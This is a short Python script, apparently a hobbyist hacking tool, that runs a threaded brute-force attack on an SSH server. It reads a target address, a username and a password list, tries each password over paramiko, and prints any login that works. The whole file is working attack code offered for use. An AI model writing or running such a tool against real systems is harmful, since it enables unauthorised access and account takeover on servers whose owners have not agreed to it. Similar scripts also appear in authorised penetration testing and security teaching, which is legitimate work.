import threading
import time
import os
import paramiko
import sys
import termcolor

stop_flag = 0


def ssh_connect(password):
    """
    Create ssh client and connect to host.
    Using paramiko, help us to create SSH client.
    Port for SSH by default is 22
    :param password: password
    :return: return if we find the password and the username
    """

    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()


host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

# checking if file with password exist or not
if not os.path.exists(input_file):
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')

# open the file and read line by line
# try to connect with the password
# we initialize a threading in order for faster implementation of our code
# we 0.5 sec between each start of our thread
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
